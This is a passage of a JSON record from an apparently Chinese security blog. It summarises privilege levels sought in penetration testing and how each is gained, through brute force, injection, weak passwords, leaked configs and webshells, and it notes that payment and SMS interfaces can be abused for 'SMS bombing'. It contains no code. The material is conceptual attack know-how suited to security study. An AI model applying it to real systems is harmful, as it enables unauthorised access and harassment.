15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>1、内网渗透中主机权限的获取：1.网站，2.数据库，3.HTTP</p>\n<p>2、具体的权限：1.后台权限2.网站权限3.数据库权限4.接口权限5.系统权限，6.域控权限</p>\n<p>3、后台权限：一般网站或者应用后台只能操作应用界面内容数据图片信息，无法操作程序的源代码，或者服务器的资源文件。（如果后台存在文件操作，也可以操作文件）（获取方式：爆破，注入猜解，弱口令）</p>\n<p>4、网站权限：查看或者修改程序源代码，可以进行网站的配置文件读取（接口配置信息，数据库配置信息等等），还能收集服务器操作系统的信息，为后续系统提权铺垫（文件上传）</p>\n<p>5、数据库权限：操作数据库增删改查等等（获取方式：源码或者配置文件泄露，也可以是网站权限（webshell）进行数据库配置文件读取）</p>\n<p>6、接口权限：邮件，短信，支付，第三方支付（更改接口，可以更改支付，或者调用短信轰炸）</p>\n<p>7、相关操作被拒绝无法实现的时候，就会涉及到权限提升</p></blockquote>\n","text":"0x00脑图： 0x01 权限分类 1、后台权限：（获得方式：爆破，注入猜解，弱口令等获取的帐号密码配合登录） 一般网站或应用后台只能操作应用的界面内容数据图片等信息，无法操作程序的源代码或服务器上的资源文件的。（如后台功能存在文件操作的话也可以操作文件数据） 2、网站权限：（获...","link":"","photos":[],"count_time":{"symbolsCount":"2.6k","symbolsTime":"2 mins."},"categories":[{"name":"权限提升","slug":"权限提升","count":10,"path":"api/categories/权限提升.json"}],"tags":[{"name":"权限提升","slug":"权限提升","count":10,"path":"api/tags/权限提升.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x00\"><span class=\"toc-text\">0x00</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x01-%E6%9D%83%E9%99%90%E5%88%86%E7%B1%BB\"><span class=\"toc-text\">0x01 权限分类</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x02-%E6%9F%90%E5%A4%96%E6%8C%82%E7%BD%91%E7%AB%99%E7%9A%84%E7%AE%80%E5%8D%95%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%EF%BC%88%E5%AE%9E%E6%88%98%EF%BC%89\"><span class=\"toc-text\">0x02 某外挂网站的简单渗透提权（实战）</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x00-1\"><span class=\"toc-text\">0x00</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x01\"><span class=\"toc-text\">0x01</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x02\"><span class=\"toc-text\">0x02</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x03\"><span class=\"toc-text\">0x03</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x04\"><span class=\"toc-text\">0x04</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x05\"><span class=\"toc-text\">0x05</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x06\"><span class=\"toc-text\">0x06</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x07\"><span class=\"toc-text\">0x07</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x08\"><span class=\"toc-text\">0x08</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x03-GlassFish-%E7%AC%AC%E4%B8%89%E6%96%B9%E4%B8%AD%E9%97%B4%E4%BB%B6\"><span class=\"toc-text\">0x03 GlassFish 第三方中间件</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x00-2\"><span class=\"toc-text\">0x00</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x01-1\"><span class=\"toc-text\">0x01</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x02-1\"><span class=\"toc-text\">0x02</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x03-1\"><span class=\"toc-text\">0x03</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x04-%E6%80%BB%E7%BB%93\"><span class=\"toc-text\">0x04 总结</span></a></li></ol>","author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"权限提升-windows提权","uid":"e38c975ecb9beb0ae47fa044c10774fe","slug":"权限提升-windows提权","date":"2022-06-19T14:00:54.000Z","updated":"2022-06-20T02:03:43.786Z","comments":true,"path":"api/articles/权限提升-windows提权.json","keywords":null,"cover":[],"text":"0x00脑图： 0x01 windows权限划分0x00 普通权限 1、默认情况下，系统为用户分了7个组，并给每个组赋予不同的操作权限，管理员组(Administrators)、高权限用户组(PowerUsers)、普通用户组(Users)、备份操作组(Backup Operat...","link":"","photos":[],"count_time":{"symbolsCount":"3.5k","symbolsTime":"3 mins."},"categories":[{"name":"权限提升","slug":"权限提升","count":10,"path":"api/categories/权限提升.json"}],"tags":[{"name":"权限提升","slug":"权限提升","count":10,"path":"api/tags/权限提升.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"代码审计-TP5框架1","uid":"189405de58d744911bbd6ef55ac89edc","slug":"代码审计-TP5框架1","date":"2022-06-18T01:49:09.000Z","updated":"2022-06-18T15:42:07.123Z","comments":true,"path":"api/articles/代码审计-TP5框架1.json","keywords":null,"cover":[],"text":"0x00脑图： 0x01 Metinfo-无框架-变量覆盖-自动审计或搜索0x00打开靶场： 0x01使用seay先进行自动审计： 检测到可能存在变量覆盖漏洞： 0x02打开其配置文件审计相关函数： 可以看到双$$符号。 foreach()函数，每次循环中，当前单元的值被赋给 $...","link":"","photos":[],"count_time":{"symbolsCount":"2.2k","symbolsTime":"2 mins."},"categories":[{"name":"代码审计","slug":"代码审计","count":4,"path":"api/categories/代码审计.json"}],"tags":[{"name":"代码审计","slug":"代码审计","count":6,"path":"api/tags/代码审计.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}